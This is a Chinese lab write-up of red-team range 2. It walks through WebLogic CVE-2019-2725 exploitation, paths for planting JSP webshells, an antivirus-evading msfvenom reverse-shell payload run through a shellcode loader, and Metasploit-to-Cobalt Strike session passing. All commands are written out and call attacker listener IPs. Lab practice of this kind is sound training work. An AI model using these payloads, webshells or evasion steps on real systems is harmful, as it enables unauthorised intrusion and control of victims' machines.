## 前言

通过以往文章的靶场一，初窥了CS联合作战、CS与msf的联动、内网信息收集、redis渗透、横向移动[wmi利用]、获取域控权限等等姿势。但靶场一赤裸裸没有任何需要做免杀的地方不够贴合实战。靶场二有了360全家桶，UAC一起来看看如何去渗透吧。

吃水勿忘挖井人，感谢红日团队的优秀靶场！

 **本次涉及知识点**

  * Bypass UAC
  * Windows系统NTLM获取（理论知识：Windows认证）
  * Access Token利用（MSSQL利用）
  * WMI利用
  * 网页代理，二层代理，特殊协议代理（DNS，ICMP）
  * 域内信息收集
  * 域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用
  * 域凭证收集
  * 后门技术（黄金票据/白银票据/Sid History/MOF）

##  **0x00：靶场介绍**

红日红队实战系列，主要以真实企业环境为实例搭建一系列靶场。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS
relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。

此次拓扑图如下

![v2-a8a8afd1dc2735336efe414a3c789404_720w.jpg](https://image.3001.net/images/20210106/1609904879_5ff532efba0c5698971b1.jpg!small)

环境如下

 **web.delay.com（域主机）**

双网卡：172.16.143.134(外网） 10.10.10.80（内网）

 **pc.delay.com（域主机）**

双网卡：172.16.143.138(外网） 10.10.10.201（内网）

 **dc.delay.com（域控）**

10.10.10.10

##  **0x01：渗透开始**

首先抛开上帝视角，对172.16.143.134进行信息收集

扫端口发现开放了7001和80。

分别访问得知80端口空白页面，扫目录未果

7001是weblogic的默认端口，weblogic漏洞多的不行，直接上weblogicscan进行扫描，果不其然扫出如下漏洞

  * weblogic的uddiexplorer目录下的SSRF
  * cve-2019-2725
  * cve-2019-2729
  * cve-2017-3506
  * weblogic的默认登录后台

![v2-a6a8bdd1f7d3228e0d6c3d76c254d7e2_720w.jpg](https://image.3001.net/images/20210106/1609904880_5ff532f0a4f113a6e6abb.jpg!small)

默认后台尝试登录失败。

![v2-96a52100f5564a6b6e3a4a5233b1e2d3_720w.jpg](https://image.3001.net/images/20210106/1609904881_5ff532f14a71a94a46310.jpg!small)

这里ssrf利用起来意义不大，直接尝试cve-2019-2725的反序列化进行getshell。直接上这款名字作者很社会的工具by6哥直接打，成功获得权限，且权限为Administrator。

![v2-e52bf914dec5156b55ae54a28f86ff81_720w.jpg](https://image.3001.net/images/20210106/1609904882_5ff532f203c422a5f6a7f.jpg!small)

在6哥这个工具上执行命令发现开了3389，可以查看端口netstat -ano，但net
user这种添加命令时就会报如下错，遂罢。因为java没有eval这种直接执行命令的函数，蚁剑不好使，我们直接通过6哥工具上传一个冰蝎shell。

![v2-338178174d9c4de066d891c93ced8f6c_720w.jpg](https://image.3001.net/images/20210106/1609904882_5ff532f28c475bce6917c.jpg!small)

可以通过如下方法来进行weblogic路径上传，大多数weblogic的路径都是默认如下，三种方法可以实现上传getshell。

    
    
    方法1：把shell写到控制台images目录中
    \Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp 目录上传木马，
    访问 http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp
    方法2：写到uddiexplorer目录中
    \Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp 目录写入木马，
    访问 http://*.*.*.*:7001/uddiexplorer/shell.jsp
    方法3：在应用安装目录中
    \Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp 目录写入木马，
    访问 http://*.*.*.*:7001/项目名/shell.jsp 

当然啦，6哥这款工具有个文件管理功能，一步一步翻阅也可以，oracle目录下，最终上传目录如下，我们选择上面的方法2写道uddiexplorer目录中。

    
    
    C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war

![v2-c2acab501915dab56452fe8239ec65f5_720w.jpg](https://image.3001.net/images/20210106/1609904883_5ff532f32114cce3904ed.jpg!small)

上传成功后，成功连上冰蝎，就可以执行net user等等带空格命令啦。

![v2-b8074420d7f040489f0d068573ff1960_720w.jpg](https://image.3001.net/images/20210106/1609904883_5ff532f3d5cf7945d66de.jpg!small)

直接进行net user xxx xxx /add失败且一直处于响应状态，通过前面翻阅目录发现有360，大致是被360查杀了，查看一下虚拟机靶场。

![](https://image.3001.net/images/20210106/1609904668_5ff5321c89f0c4f3411ea.png!small)

![v2-a1d65d8c0f64ceb25138b3dd6a4dc52f_720w.jpg](https://image.3001.net/images/20210106/1609904884_5ff532f4ab01655e7bc13.jpg!small)

有了360那就要干免杀了,且当前主机在域内（[http://de1ay.com](https://link.zhihu.com/?target=http%3A//de1ay.com)），先让msf上线收集搞一波再说。

![v2-a7f545b82dffe9c5fa900e2b692f6c53_720w.jpg](https://image.3001.net/images/20210106/1609904885_5ff532f5903cb4cf53180.jpg!small)

##  **0x02：开始免杀msf上线**

经过一系列的绕过尝试，最终选择 Shellcode 本地加载实现免杀绕过 360。

 **摘自亮神对于免杀的理解：**

> 目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。无论是哪种，都是特别针对 PE
> 头文件的查杀。尤其是当 payload 文件越大的时候，特征越容易查杀。  
>  
> 既然知道了目前的主流查杀方式，那么反制查杀，此篇采取特征与行为分离免杀。避免 PE
> 头文件，并且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于 windows 下为了更稳定的一种常用手法。载入内存。  
>  
> 我们这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为。

首先msfvenom生成木马，这里采用x86/shikata_ga_nai编码器,编码5次。

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.143.135 lport=4444 -e x86/shikata_ga_nai -i 5 -f raw > test.c

既然是shellcode方式的payload，那么一定需要借助第三方来启动，加载到内存。执行shellcode，这里借用一个github一个开源：

借助第三方加载器，将shellcode加载到内存中来执行。

    
    
    下载地址：https://github.com/clinicallyinane/shellcode_launche 

通过靶机的冰蝎shell将test.c和shellcode_launcher.exe上传到靶机。

msf控制台执行

    
    
    use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp
     set LHSOT 172.16.143.135
     set LPORT 4444
     run 

靶机冰蝎执行如下命令

shellcode_launcher.exe -i test.c

![v2-afb6acb6a58d5efbfaf16a12b4ecd013_720w.jpg](https://image.3001.net/images/20210106/1609904886_5ff532f63a83e76206078.jpg!small)

(这里是test1.c，不影响，文件名字自定义）

![v2-259bcb3af5fe2fb2c72baf9d60272971_720w.jpg](https://image.3001.net/images/20210106/1609904887_5ff532f706f59f5f7c8a5.jpg!small)

成功绕过360获得meterpretershell，当然这里是静态检测比较好绕。

##  **0x03：msf派生CS**

cs设置一个监听用于派生上线

![v2-1479d725096bdf81654cdf6c424cfbd7_720w.jpg](https://image.3001.net/images/20210106/1609904888_5ff532f83ade7c821cd8d.jpg!small)

msf执行如下命令

    
    
    msf exploit(handler) >  use exploit/windows/local/payload_inject 
    msf exploit(payload_inject) >  set PAYLOAD windows/meterpreter/reverse_http //cs监听器中相同
    msf exploit(payload_inject) > set DisablePayloadHandler true //告诉msf已建立监听，不必新建监听
    msf exploit(payload_inject) > set LHOST 192.168.229.143 //cs的IP
    msf exploit(payload_inject) > set LPORT 3333 //cs监听器中监听的端口
    msf exploit(payload_inject) > set SESSION 1  
    msf exploit(payload_inject) > exploit
    

![v2-335c5623760bf731aea4217ca8eece4a_720w.jpg](https://image.3001.net/images/20210106/1609904888_5ff532f8b612547633734.jpg!small)

cs成功上线

![v2-9619f335a85bd09721626f83bbfbd80f_720w.jpg](https://image.3001.net/images/20210106/1609904896_5ff53300bfc7447ce6e53.jpg!small)

至此我们就有了MSF和CS的shell，接下来就是做好信息收集，为横向移动做准备。

